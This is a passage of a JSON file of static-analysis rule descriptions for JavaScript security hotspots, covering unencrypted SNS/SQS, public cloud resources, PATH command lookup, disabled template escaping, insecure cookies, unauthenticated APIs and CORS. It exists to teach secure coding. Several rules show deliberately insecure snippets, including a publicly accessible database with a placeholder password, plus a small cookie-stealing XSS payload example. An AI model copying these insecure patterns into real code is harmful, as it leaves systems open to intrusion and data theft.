        "htmlDesc": "<p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)\ncommunication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages\nwhen they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to\naccess the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The topic contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html\"><code>aws_cdk.aws_sns.Topic</code></a></p>\n<pre>\nimport { Topic } from 'aws-cdk-lib/aws-sns';\n\nnew Topic(this, 'exampleTopic'); // Sensitive\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html\"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>\n<pre>\nimport { Topic, CfnTopic } from 'aws-cdk-lib/aws-sns';\n\nnew CfnTopic(this, 'exampleCfnTopic'); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html\"><code>aws_cdk.aws_sns.Topic</code></a></p>\n<pre>\nimport { Topic } from 'aws-cdk-lib/aws-sns';\n\nconst encryptionKey = new Key(this, 'exampleKey', {\n    enableKeyRotation: true,\n});\n\nnew Topic(this, 'exampleTopic', {\n    masterKey: encryptionKey\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html\"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>\n<pre>\nimport { CfnTopic } from 'aws-cdk-lib/aws-sns';\n\nconst encryptionKey = new Key(this, 'exampleKey', {\n    enableKeyRotation: true,\n});\n\ncfnTopic = new CfnTopic(this, 'exampleCfnTopic', {\n    kmsMasterKeyId: encryptionKey.keyId\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html\">AWS Documentation</a> - Encryption at rest </li>\n  <li> <a href=\"https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/\">Encrypting messages published to\n  Amazon SNS with AWS KMS</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S6329": {
        "name": "Allowing public network access to cloud resources is security-sensitive",
        "htmlDesc": "<p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft\nor disruption.</p>\n<p>Depending on the component, inbound access from the Internet can be enabled via:</p>\n<ul>\n  <li> a boolean value that explicitly allows access to the public network. </li>\n  <li> the assignment of a public IP address. </li>\n  <li> database firewall rules that allow public IP ranges. </li>\n</ul>\n<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>\n<p>This decision increases the likelihood of attacks on the organization, such as:</p>\n<ul>\n  <li> data breaches. </li>\n  <li> intrusions into the infrastructure to permanently steal from it. </li>\n  <li> and various malicious traffic, such as DDoS attacks. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<p>This cloud resource:</p>\n<ul>\n  <li> should be publicly accessible to any Internet user. </li>\n  <li> requires inbound traffic from the Internet to function properly. </li>\n</ul>\n<p>There is a risk if you answered no to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce\nsites.</p>\n<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud\ncomponents.</p>\n<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the\nabsence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html\">aws-cdk-lib.aws_ec2.Instance</a> and similar\nconstructs:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.Instance(this, \"example\", {\n    instanceType: nanoT2,\n    machineImage: ec2.MachineImage.latestAmazonLinux(),\n    vpc: vpc,\n    vpcSubnets: {subnetType: ec2.SubnetType.PUBLIC} // Sensitive\n})\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html\">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.CfnInstance(this, \"example\", {\n    instanceType: \"t2.micro\",\n    imageId: \"ami-0ea0f26a6d50850c5\",\n    networkInterfaces: [\n        {\n            deviceIndex: \"0\",\n            associatePublicIpAddress: true, // Sensitive\n            deleteOnTermination: true,\n            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PUBLIC}).subnetIds[0]\n        }\n    ]\n})\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html\">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew dms.CfnReplicationInstance(\n    this, \"example\", {\n    replicationInstanceClass: \"dms.t2.micro\",\n    allocatedStorage: 5,\n    publiclyAccessible: true, // Sensitive\n    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,\n    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]\n})\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html\">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst rdsSubnetGroupPublic = new rds.CfnDBSubnetGroup(this, \"publicSubnet\", {\n    dbSubnetGroupDescription: \"Subnets\",\n    dbSubnetGroupName: \"publicSn\",\n    subnetIds: vpc.selectSubnets({\n        subnetType: ec2.SubnetType.PUBLIC\n    }).subnetIds\n})\n\nnew rds.CfnDBInstance(this, \"example\", {\n    engine: \"postgres\",\n    masterUsername: \"foobar\",\n    masterUserPassword: \"12345678\",\n    dbInstanceClass: \"db.r5.large\",\n    allocatedStorage: \"200\",\n    iops: 1000,\n    dbSubnetGroupName: rdsSubnetGroupPublic.ref,\n    publiclyAccessible: true, // Sensitive\n    vpcSecurityGroups: [sg.securityGroupId]\n})\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html\">aws-cdk-lib.aws_ec2.Instance</a> and similar\nconstructs:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.Instance(\n    this,\n    \"example\", {\n    instanceType: nanoT2,\n    machineImage: ec2.MachineImage.latestAmazonLinux(),\n    vpc: vpc,\n    vpcSubnets: {subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}\n})\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html\">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.CfnInstance(this, \"example\", {\n    instanceType: \"t2.micro\",\n    imageId: \"ami-0ea0f26a6d50850c5\",\n    networkInterfaces: [\n        {\n            deviceIndex: \"0\",\n            associatePublicIpAddress: false,\n            deleteOnTermination: true,\n            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}).subnetIds[0]\n        }\n    ]\n})\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html\">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew dms.CfnReplicationInstance(\n    this, \"example\", {\n    replicationInstanceClass: \"dms.t2.micro\",\n    allocatedStorage: 5,\n    publiclyAccessible: false,\n    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,\n    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]\n})\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html\">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst rdsSubnetGroupPrivate = new rds.CfnDBSubnetGroup(this, \"example\",{\n    dbSubnetGroupDescription: \"Subnets\",\n    dbSubnetGroupName: \"privateSn\",\n    subnetIds: vpc.selectSubnets({\n        subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS\n    }).subnetIds\n})\n\nnew rds.CfnDBInstance(this, \"example\", {\n    engine: \"postgres\",\n    masterUsername: \"foobar\",\n    masterUserPassword: \"12345678\",\n    dbInstanceClass: \"db.r5.large\",\n    allocatedStorage: \"200\",\n    iops: 1000,\n    dbSubnetGroupName: rdsSubnetGroupPrivate.ref,\n    publiclyAccessible: false,\n    vpcSecurityGroups: [sg.securityGroupId]\n})\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html\">AWS Documentation</a> - Amazon EC2 instance IP\n  addressing </li>\n  <li> <a href=\"https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html\">AWS Documentation</a> - Public and\n  private replication instances </li>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html\">AWS Documentation</a> - VPC Peering </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S4036": {
        "name": "Searching OS commands in PATH is security-sensitive",
        "htmlDesc": "<p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>\nenvironment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in\n<code>PATH</code> is a directory under his control.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst cp = require('child_process');\ncp.exec('file.exe'); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconst cp = require('child_process');\ncp.exec('/usr/bin/file.exe'); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/426\">CWE-426 - Untrusted Search Path</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/427\">CWE-427 - Uncontrolled Search Path Element</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S5247": {
        "name": "Disabling auto-escaping in template engines is security-sensitive",
        "htmlDesc": "<p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,\n<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters\nthat make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>\n<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a\nhref=\"https://twig.symfony.com/doc/3.x/filters/escape.html\">the strategy applied</a> and the context, for example a \"html auto-escaping\" strategy\n(which only transforms html characters into <a href=\"https://developer.mozilla.org/en-US/docs/Glossary/Entity\">html entities</a>) will not be relevant\nwhen variables are used in a <a href=\"https://en.wikipedia.org/wiki/HTML_attribute\">html attribute</a> because '<code>:</code>' character is not\nescaped and thus an attack as below is possible:</p>\n<pre>\n&lt;a href=\"{{ myLink }}\"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)\n&lt;a href=\"javascript:alert(document.cookie)\"&gt;link&lt;/a&gt; // JS injection (XSS attack)\n</pre>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Templates are used to render web content and\n    <ul>\n      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>\n      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>\n    </ul>  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right\none.</p>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/mustache\">mustache.js</a> template engine:</p>\n<pre>\nlet Mustache = require(\"mustache\");\n\nMustache.escape = function(text) {return text;}; // Sensitive\n\nlet rendered = Mustache.render(template, { name: inputName });\n</pre>\n<p><a href=\"https://www.npmjs.com/package/handlebars\">handlebars.js</a> template engine:</p>\n<pre>\nconst Handlebars = require('handlebars');\n\nlet source = \"&lt;p&gt;attack {{name}}&lt;/p&gt;\";\n\nlet template = Handlebars.compile(source, { noEscape: true }); // Sensitive\n</pre>\n<p><a href=\"https://www.npmjs.com/package/markdown-it\">markdown-it</a> markup language parser:</p>\n<pre>\nconst markdownIt = require('markdown-it');\nlet md = markdownIt({\n  html: true // Sensitive\n});\n\nlet result = md.render('# &lt;b&gt;attack&lt;/b&gt;');\n</pre>\n<p><a href=\"https://www.npmjs.com/package/marked\">marked</a> markup language parser:</p>\n<pre>\nconst marked = require('marked');\n\nmarked.setOptions({\n  renderer: new marked.Renderer(),\n  sanitize: false // Sensitive\n});\n\nconsole.log(marked(\"# test &lt;b&gt;attack/b&gt;\"));\n</pre>\n<p><a href=\"https://www.npmjs.com/package/kramed\">kramed</a> markup language parser:</p>\n<pre>\nlet kramed = require('kramed');\n\nvar options = {\n  renderer: new kramed.Renderer({\n    sanitize: false // Sensitive\n  })\n};\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/mustache\">mustache.js</a> template engine:</p>\n<pre>\nlet Mustache = require(\"mustache\");\n\nlet rendered = Mustache.render(template, { name: inputName }); // Compliant autoescaping is on by default\n</pre>\n<p><a href=\"https://www.npmjs.com/package/handlebars\">handlebars.js</a> template engine:</p>\n<pre>\nconst Handlebars = require('handlebars');\n\nlet source = \"&lt;p&gt;attack {{name}}&lt;/p&gt;\";\nlet data = { \"name\": \"&lt;b&gt;Alan&lt;/b&gt;\" };\n\nlet template = Handlebars.compile(source); // Compliant by default noEscape is set to false\n</pre>\n<p><a href=\"https://www.npmjs.com/package/markdown-it\">markdown-it</a> markup language parser:</p>\n<pre>\nlet md = require('markdown-it')(); // Compliant by default html is set to false\n\nlet result = md.render('# &lt;b&gt;attack&lt;/b&gt;');\n</pre>\n<p><a href=\"https://www.npmjs.com/package/marked\">marked</a> markup language parser:</p>\n<pre>\nconst marked = require('marked');\n\nmarked.setOptions({\n  renderer: new marked.Renderer()\n}); // Compliant by default sanitize is set to true\n\nconsole.log(marked(\"# test &lt;b&gt;attack/b&gt;\"));\n</pre>\n<p><a href=\"https://www.npmjs.com/package/kramed\">kramed</a> markup language parser:</p>\n<pre>\nlet kramed = require('kramed');\n\nlet options = {\n  renderer: new kramed.Renderer({\n    sanitize: true // Compliant\n  })\n};\n\nconsole.log(kramed('Attack [xss?](javascript:alert(\"xss\")).', options));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md\">OWASP Cheat\n  Sheet</a> - XSS Prevention Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S6330": {
        "name": "Using unencrypted SQS queues is security-sensitive",
        "htmlDesc": "<p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store\nmessages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message\nfrom the file system, for example through a vulnerability in the service, they are not able to access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The queue contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html\"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>\n<pre>\nimport { Queue } from 'aws-cdk-lib/aws-sqs';\n\nnew Queue(this, 'example'); // Sensitive\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html\"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>\n<pre>\nimport { CfnQueue } from 'aws-cdk-lib/aws-sqs';\n\nnew CfnQueue(this, 'example'); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html\"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>\n<pre>\nimport { Queue } from 'aws-cdk-lib/aws-sqs';\n\nnew Queue(this, 'example', {\n    encryption: QueueEncryption.KMS_MANAGED\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html\"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>\n<pre>\nimport { CfnQueue } from 'aws-cdk-lib/aws-sqs';\n\nconst encryptionKey = new Key(this, 'example', {\n    enableKeyRotation: true,\n});\n\nnew CfnQueue(this, 'example', {\n    kmsMasterKeyId: encryptionKey.keyId\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html\">AWS Documentation</a> -\n  Encryption at rest </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S6333": {
        "name": "Creating public APIs is security-sensitive",
        "htmlDesc": "<p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>\n<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br> This means attacks\nboth on the functionality provided by the API and its infrastructure.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The underlying API exposes all of its contents to any anonymous Internet user. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>In general, prefer limiting API access to a specific set of people or entities.</p>\n<p>AWS provides multiple methods to do so:</p>\n<ul>\n  <li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li>\n  <li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li>\n  <li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html\">aws-cdk-lib.aws_apigateway.Resource</a>:</p>\n<pre>\nimport {aws_apigateway as apigateway} from \"aws-cdk-lib\"\n\nconst resource = api.root.addResource(\"example\")\nresource.addMethod(\n    \"GET\",\n    new apigateway.HttpIntegration(\"https://example.org\"),\n    {\n        authorizationType: apigateway.AuthorizationType.NONE // Sensitive\n    }\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html\">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>\n<pre>\nimport {aws_apigatewayv2 as apigateway} from \"aws-cdk-lib\"\n\nnew apigateway.CfnRoute(this, \"no-auth\", {\n    apiId: api.ref,\n    routeKey: \"GET /no-auth\",\n    authorizationType: \"NONE\", // Sensitive\n    target: exampleIntegration\n})\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html\">aws-cdk-lib.aws_apigateway.Resource</a>:</p>\n<pre>\nimport {aws_apigateway as apigateway} from \"aws-cdk-lib\"\n\nconst resource = api.root.addResource(\"example\",{\n    defaultMethodOptions:{\n        authorizationType: apigateway.AuthorizationType.IAM\n    }\n})\nresource.addMethod(\n    \"POST\",\n    new apigateway.HttpIntegration(\"https://example.org\"),\n    {\n        authorizationType: apigateway.AuthorizationType.IAM\n    }\n)\nresource.addMethod(  // authorizationType is inherited from the Resource's configured defaultMethodOptions\n    \"GET\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html\">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>\n<pre>\nimport {aws_apigatewayv2 as apigateway} from \"aws-cdk-lib\"\n\nnew apigateway.CfnRoute(this, \"auth\", {\n    apiId: api.ref,\n    routeKey: \"POST /auth\",\n    authorizationType: \"AWS_IAM\",\n    target: exampleIntegration\n})\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html\">AWS Documentation</a> -\n  Controlling and managing access to a REST API in API Gateway </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S2092": {
        "name": "Creating cookies without the \"secure\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP\nrequest and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>\n  <li> it’s not sure that the website contains <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\">mixed content</a> or not\n  (ie HTTPS everywhere or not) </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour\n  when creating cookies. </li>\n  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/cookie-session\">cookie-session</a> module:</p>\n<pre>\nlet session = cookieSession({\n  secure: false,// Sensitive\n});  // Sensitive\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express-session\">express-session</a> module:</p>\n<pre>\nconst express = require('express');\nconst session = require('express-session');\n\nlet app = express();\napp.use(session({\n  cookie:\n  {\n    secure: false // Sensitive\n  }\n}));\n</pre>\n<p><a href=\"https://www.npmjs.com/package/cookies\">cookies</a> module:</p>\n<pre>\nlet cookies = new Cookies(req, res, { keys: keys });\n\ncookies.set('LastVisit', new Date().toISOString(), {\n  secure: false // Sensitive\n}); // Sensitive\n</pre>\n<p><a href=\"https://www.npmjs.com/package/csurf\">csurf</a> module:</p>\n<pre>\nconst cookieParser = require('cookie-parser');\nconst csrf = require('csurf');\nconst express = require('express');\n\nlet csrfProtection = csrf({ cookie: { secure: false }}); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/cookie-session\">cookie-session</a> module:</p>\n<pre>\nlet session = cookieSession({\n  secure: true,// Compliant\n});  // Compliant\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express-session\">express-session</a> module:</p>\n<pre>\nconst express = require('express');\nconst session = require('express-session');\n\nlet app = express();\napp.use(session({\n  cookie:\n  {\n    secure: true // Compliant\n  }\n}));\n</pre>\n<p><a href=\"https://www.npmjs.com/package/cookies\">cookies</a> module:</p>\n<pre>\nlet cookies = new Cookies(req, res, { keys: keys });\n\ncookies.set('LastVisit', new Date().toISOString(), {\n  secure: true // Compliant\n}); // Compliant\n</pre>\n<p><a href=\"https://www.npmjs.com/package/csurf\">csurf</a> module:</p>\n<pre>\nconst cookieParser = require('cookie-parser');\nconst csrf = require('csurf');\nconst express = require('express');\n\nlet csrfProtection = csrf({ cookie: { secure: true }}); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/315\">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/614\">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S5122": {
        "name": "Having a permissive Cross-Origin Resource Sharing policy is security-sensitive",
        "htmlDesc": "<p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269\">CVE-2018-0269</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460\">CVE-2017-14460</a> </li>\n</ul>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">Same origin policy</a> in browsers prevents, by default and for\nsecurity-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)\nfrom its own. The requested target can append additional HTTP headers in response, called <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">CORS</a>, that act like directives for the browser and change the access control policy\n/ relax the same origin policy.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>\n  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>\n  <li> Your access control policy is dynamically defined by a user-controlled input like <a\n  href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\"><code>origin</code></a> header. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>\n  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or\n  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://nodejs.org/api/http.html\">nodejs http</a> built-in module:</p>\n<pre>\nconst http = require('http');\nconst srv = http.createServer((req, res) =&gt; {\n  res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); // Sensitive\n  